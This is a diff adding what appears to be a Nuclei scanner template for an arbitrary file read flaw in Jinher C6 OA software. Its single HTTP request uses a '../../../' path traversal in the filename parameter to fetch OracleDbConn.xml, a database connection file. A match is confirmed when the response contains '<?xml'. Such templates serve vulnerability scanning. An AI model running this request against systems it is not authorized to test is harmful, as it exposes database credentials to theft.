@@ -1,0 +1,20 @@
+id: jinher-FileUploadMessage-readfile
+info:
+  name: jinher-FileUploadMessage-readfile
+  author: apple
+  severity: high
+  description: description
+  reference:
+    - https://mp.weixin.qq.com/s/megMMQbSNROluqA78gIXrQ
+  tags: jinhe
+http:
+  - raw:
+      - |-
+        GET /C6/JHSoft.WCF/FunctionNew/FileUploadMessage.aspx?filename=../../../C6/JhSoft.Web.Dossier.JG/JhSoft.Web.Dossier.JG/XMLFile/OracleDbConn.xml HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '<?xml'
